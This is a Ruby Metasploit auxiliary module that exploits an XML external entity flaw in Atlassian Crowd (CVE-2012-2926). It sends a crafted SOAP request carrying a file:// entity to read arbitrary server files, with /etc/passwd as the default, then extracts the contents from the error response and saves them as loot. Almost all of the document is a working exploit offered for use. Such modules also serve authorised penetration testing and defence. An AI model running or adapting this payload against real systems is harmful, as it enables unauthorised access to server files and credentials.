##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'         => 'Atlassian Crowd XML Entity Expansion Remote File Access',
      'Description'  =>  %q{
          This module simply attempts to read a remote file from the server using a
        vulnerability in the way Atlassian Crowd handles XML files. The vulnerability
        occurs while trying to expand external entities with the SYSTEM identifier. This
        module has been tested successfully on Linux and Windows installations of Crowd.
      },
      'References'   =>
        [
          [ 'CVE', '2012-2926' ],
          [ 'OSVDB', '82274' ],
          [ 'BID', '53595' ],
          [ 'URL', 'https://www.neg9.org' ], # General
          [ 'URL', 'https://confluence.atlassian.com/display/CROWD/Crowd+Security+Advisory+2012-05-17']
        ],
      'Author'       =>
        [
          'Will Caput', # Vulnerability discovery and Metasploit module
          'Trevor Hartman', # Vulnerability discovery
          'Thaddeus Bogner', # Metasploit module
          'juan vazquez' # Metasploit module help
        ],
      'License'      => MSF_LICENSE
    )

    register_options(
    [
      Opt::RPORT(8095),
      OptString.new('TARGETURI', [true, 'Path to Crowd', '/crowd/services']),
      OptString.new('RFILE', [true, 'Remote File', '/etc/passwd'])

    ])

    register_autofilter_ports([ 8095 ])
    deregister_options('RHOST')
  end

  def run_host(ip)
    uri = normalize_uri(target_uri.path)
    res = send_request_cgi({
      'uri'     => uri,
      'method'  => 'GET'})

    if not res
      print_error("#{rhost}:#{rport} Unable to connect")
      return
    end

    accessfile(ip)
  end

  def accessfile(rhost)
    uri = normalize_uri(target_uri.path)
    print_status("#{rhost}:#{rport} Connecting to Crowd SOAP Interface")

    soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'
    xmlaut = 'http://authentication.integration.crowd.atlassian.com'
    xmlsoap = 'http://soap.integration.crowd.atlassian.com'
    entity = Rex::Text.rand_text_alpha(rand(4) + 4)

    data = "<!DOCTYPE foo [<!ENTITY #{entity} SYSTEM \"file://#{datastore['RFILE']}\"> ]>" + "\r\n"
    data << '<soapenv:Envelope xmlns:soapenv="' + soapenv + '" xmlns:urn="urn:SecurityServer" xmlns:aut="' + xmlaut + '" xmlns:soap="' + xmlsoap + '">' + "\r\n"
    data << '<soapenv:Header/>' + "\r\n"
    data << '<soapenv:Body>' + "\r\n"
    data << '<urn:addAllPrincipals>' + "\r\n"
    data << '<urn:in0>' + "\r\n"
    data << '<!--Optional:-->' + "\r\n"
    data << '<aut:name>?</aut:name>' + "\r\n"
    data << '<!--Optional:-->' + "\r\n"
    data << '<aut:token>?</aut:token>' + "\r\n"
    data << '</urn:in0>' + "\r\n"
    data << '<urn:in1>' + "\r\n"
    data << '<!--Zero or more repetitions:-->' + "\r\n"
    data << '<soap:SOAPPrincipalWithCredential>' + "\r\n"
    data << '<!--Optional:-->' + "\r\n"
    data << '<soap:passwordCredential>' + "\r\n"
    data << '<!--Optional:-->' + "\r\n"
    data << '<aut:credential>?</aut:credential>' + "\r\n"
    data << '<!--Optional:-->' + "\r\n"
    data << '<aut:encryptedCredential>'
    data << "?&#{entity};"
    data << '</aut:encryptedCredential>' + "\r\n"
    data << '</soap:passwordCredential>' + "\r\n"
    data << '<!--Optional:-->' + "\r\n"
    data << '<soap:principal>' + "\r\n"
    data << '<!--Optional:-->' + "\r\n"
    data << '<soap:ID>?</soap:ID>' + "\r\n"
    data << '<!--Optional:-->' + "\r\n"
    data << '<soap:active>?</soap:active>' + "\r\n"
    data << '<!--Optional:-->' + "\r\n"
    data << '<soap:attributes>' + "\r\n"
    data << '<!--Zero or more repetitions:-->' + "\r\n"
    data << '<soap:SOAPAttribute>' + "\r\n"
    data << '<!--Optional:-->' + "\r\n"
    data << '<soap:name>?</soap:name>' + "\r\n"
    data << '<!--Optional:-->' + "\r\n"
    data << '<soap:values>' + "\r\n"
    data << '<!--Zero or more repetitions:-->' + "\r\n"
    data << '<urn:string>?</urn:string>' + "\r\n"
    data << '</soap:values>' + "\r\n"
    data << '</soap:SOAPAttribute>' + "\r\n"
    data << '</soap:attributes>' + "\r\n"

    res = send_request_cgi({
        'uri'      => uri,
        'method'   => 'POST',
        'ctype'    => 'text/xml; charset=UTF-8',
        'data'     => data,
        'headers'  => {
          'SOAPAction'    => '""',
        }}, 60)

    if res and res.code == 500
      case res.body
      when /<faultstring\>Invalid boolean value: \?(.*)<\/faultstring>/m
        loot = $1
        if not loot or loot.empty?
          print_status("#{rhost}#{rport} Retrieved empty file from #{rhost}:#{rport}")
          return
        end
        f = ::File.basename(datastore['RFILE'])
        path = store_loot('atlassian.crowd.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])
        print_good("#{rhost}:#{rport} Atlassian Crowd - #{datastore['RFILE']} saved in #{path}")
        return
      end
    end

    print_error("#{rhost}#{rport} Failed to retrieve file from #{rhost}:#{rport}")
  end
end

